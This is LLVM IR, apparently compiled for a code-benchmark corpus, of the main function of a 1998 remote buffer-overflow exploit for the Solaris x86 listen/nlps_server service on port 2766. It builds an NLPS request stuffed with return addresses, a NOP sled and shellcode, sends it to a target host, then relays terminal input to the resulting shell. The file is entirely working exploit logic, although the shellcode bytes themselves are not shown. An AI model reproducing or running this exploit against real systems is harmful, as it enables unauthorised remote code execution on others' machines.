; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_20602.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_20602.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM apr 1998 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [51 x i8] c"listen/nlps_server for solaris 2.4 2.5 2.5.1 x86\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"usage: %s address\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [17 x i8] c"error: address.\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"NLPS:002:002:\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@adr = common dso_local global i32* null, align 8
@NOPNUM = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [5 x i8] c"%02x\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [10 x i8] c"yahoo...\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 2
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* @AF_INET, align 4
  %27 = load i32, i32* @SOCK_STREAM, align 4
  %28 = call i32 @socket(i32 %26, i32 %27, i32 0)
  store i32 %28, i32* %8, align 4
  %29 = call i32 @bzero(%struct.sockaddr_in* %10, i32 12)
  %30 = load i32, i32* @AF_INET, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %30, i32* %31, align 4
  %32 = call i32 @htons(i32 2766)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %32, i32* %33, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @inet_addr(i8* %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i32 %37, i32* %39, align 4
  %40 = icmp eq i32 %37, -1
  br i1 %40, label %41, label %57

41:                                               ; preds = %25
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call %struct.hostent* @gethostbyname(i8* %44)
  store %struct.hostent* %45, %struct.hostent** %11, align 8
  %46 = icmp eq %struct.hostent* %45, null
  br i1 %46, label %47, label %50

47:                                               ; preds = %41
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %49 = call i32 @exit(i32 -1) #3
  unreachable

50:                                               ; preds = %41
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  %53 = load %struct.hostent*, %struct.hostent** %11, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @memcpy(i32* %52, i32 %55, i32 4)
  br label %57

57:                                               ; preds = %50, %25
  %58 = load i32, i32* %8, align 4
  %59 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %60 = call i64 @connect(i32 %58, %struct.sockaddr* %59, i32 12)
  %61 = icmp slt i64 %60, 0
  br i1 %61, label %62, label %65

62:                                               ; preds = %57
  %63 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %64 = call i32 @exit(i32 -1) #3
  unreachable

65:                                               ; preds = %57
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %67 = call i32 @sprintf(i8* %66, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %68 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 13
  store i8* %68, i8** %7, align 8
  store i32 0, i32* %9, align 4
  br label %69

69:                                               ; preds = %83, %65
  %70 = load i32, i32* %9, align 4
  %71 = load i32, i32* @ADRNUM, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %86

73:                                               ; preds = %69
  %74 = load i32*, i32** @adr, align 8
  %75 = load i32, i32* %9, align 4
  %76 = srem i32 %75, 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i32, i32* %74, i64 %77
  %79 = load i32, i32* %78, align 4
  %80 = trunc i32 %79 to i8
  %81 = load i8*, i8** %7, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %7, align 8
  store i8 %80, i8* %81, align 1
  br label %83

83:                                               ; preds = %73
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %9, align 4
  br label %69

86:                                               ; preds = %69
  store i32 0, i32* %9, align 4
  br label %87

87:                                               ; preds = %94, %86
  %88 = load i32, i32* %9, align 4
  %89 = load i32, i32* @NOPNUM, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %97

91:                                               ; preds = %87
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %7, align 8
  store i8 -112, i8* %92, align 1
  br label %94

94:                                               ; preds = %91
  %95 = load i32, i32* %9, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %9, align 4
  br label %87

97:                                               ; preds = %87
  store i32 0, i32* %9, align 4
  br label %98

98:                                               ; preds = %112, %97
  %99 = load i32, i32* %9, align 4
  %100 = load i32*, i32** @shellcode, align 8
  %101 = call i32 @strlen(i32* %100)
  %102 = icmp slt i32 %99, %101
  br i1 %102, label %103, label %115

103:                                              ; preds = %98
  %104 = load i32*, i32** @shellcode, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = trunc i32 %108 to i8
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr inbounds i8, i8* %110, i32 1
  store i8* %111, i8** %7, align 8
  store i8 %109, i8* %110, align 1
  br label %112

112:                                              ; preds = %103
  %113 = load i32, i32* %9, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %9, align 4
  br label %98

115:                                              ; preds = %98
  %116 = load i8*, i8** %7, align 8
  store i8 0, i8* %116, align 1
  store i32 0, i32* %9, align 4
  br label %117

117:                                              ; preds = %135, %115
  %118 = load i32, i32* %9, align 4
  %119 = load i32, i32* @ADRNUM, align 4
  %120 = add nsw i32 14, %119
  %121 = load i32, i32* @NOPNUM, align 4
  %122 = add nsw i32 %120, %121
  %123 = load i32*, i32** @shellcode, align 8
  %124 = call i32 @strlen(i32* %123)
  %125 = add nsw i32 %122, %124
  %126 = add nsw i32 %125, 1
  %127 = icmp slt i32 %118, %126
  br i1 %127, label %128, label %138

128:                                              ; preds = %117
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 %133)
  br label %135

135:                                              ; preds = %128
  %136 = load i32, i32* %9, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %9, align 4
  br label %117

138:                                              ; preds = %117
  %139 = load i32, i32* @stdout, align 4
  %140 = call i32 @fflush(i32 %139)
  %141 = load i32, i32* %8, align 4
  %142 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %143 = load i32, i32* @ADRNUM, align 4
  %144 = add nsw i32 14, %143
  %145 = load i32, i32* @NOPNUM, align 4
  %146 = add nsw i32 %144, %145
  %147 = load i32*, i32** @shellcode, align 8
  %148 = call i32 @strlen(i32* %147)
  %149 = add nsw i32 %146, %148
  %150 = add nsw i32 %149, 34
  %151 = add nsw i32 %150, 1
  %152 = call i32 @write(i32 %141, i8* %142, i32 %151)
  %153 = load i32, i32* %8, align 4
  %154 = call i32 @write(i32 %153, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i32 9)
  br label %155

155:                                              ; preds = %138, %178, %202, %209
  %156 = call i32 @FD_ZERO(i32* %12)
  %157 = call i32 @FD_SET(i32 0, i32* %12)
  %158 = load i32, i32* %8, align 4
  %159 = call i32 @FD_SET(i32 %158, i32* %12)
  %160 = load i32, i32* @FD_SETSIZE, align 4
  %161 = call i64 @select(i32 %160, i32* %12, i32* null, i32* null, i32* null)
  %162 = icmp ne i64 %161, 0
  br i1 %162, label %163, label %209

163:                                              ; preds = %155
  %164 = call i64 @FD_ISSET(i32 0, i32* %12)
  %165 = icmp ne i64 %164, 0
  br i1 %165, label %166, label %185

166:                                              ; preds = %163
  %167 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %168 = call i32 @read(i32 0, i8* %167, i32 1024)
  store i32 %168, i32* %13, align 4
  %169 = icmp slt i32 %168, 1
  br i1 %169, label %170, label %180

170:                                              ; preds = %166
  %171 = load i64, i64* @errno, align 8
  %172 = load i64, i64* @EWOULDBLOCK, align 8
  %173 = icmp eq i64 %171, %172
  br i1 %173, label %178, label %174

174:                                              ; preds = %170
  %175 = load i64, i64* @errno, align 8
  %176 = load i64, i64* @EAGAIN, align 8
  %177 = icmp eq i64 %175, %176
  br i1 %177, label %178, label %179

178:                                              ; preds = %174, %170
  br label %155

179:                                              ; preds = %174
  br label %210

180:                                              ; preds = %166
  %181 = load i32, i32* %8, align 4
  %182 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %183 = load i32, i32* %13, align 4
  %184 = call i32 @write(i32 %181, i8* %182, i32 %183)
  br label %185

185:                                              ; preds = %180, %163
  %186 = load i32, i32* %8, align 4
  %187 = call i64 @FD_ISSET(i32 %186, i32* %12)
  %188 = icmp ne i64 %187, 0
  br i1 %188, label %189, label %208

189:                                              ; preds = %185
  %190 = load i32, i32* %8, align 4
  %191 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %192 = call i32 @read(i32 %190, i8* %191, i32 1024)
  store i32 %192, i32* %13, align 4
  %193 = icmp slt i32 %192, 1
  br i1 %193, label %194, label %204

194:                                              ; preds = %189
  %195 = load i64, i64* @errno, align 8
  %196 = load i64, i64* @EWOULDBLOCK, align 8
  %197 = icmp eq i64 %195, %196
  br i1 %197, label %202, label %198

198:                                              ; preds = %194
  %199 = load i64, i64* @errno, align 8
  %200 = load i64, i64* @EAGAIN, align 8
  %201 = icmp eq i64 %199, %200
  br i1 %201, label %202, label %203

202:                                              ; preds = %198, %194
  br label %155

203:                                              ; preds = %198
  br label %210

204:                                              ; preds = %189
  %205 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %206 = load i32, i32* %13, align 4
  %207 = call i32 @write(i32 1, i8* %205, i32 %206)
  br label %208

208:                                              ; preds = %204, %185
  br label %209

209:                                              ; preds = %208, %155
  br label %155

210:                                              ; preds = %203, %179
  %211 = load i32, i32* %3, align 4
  ret i32 %211
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
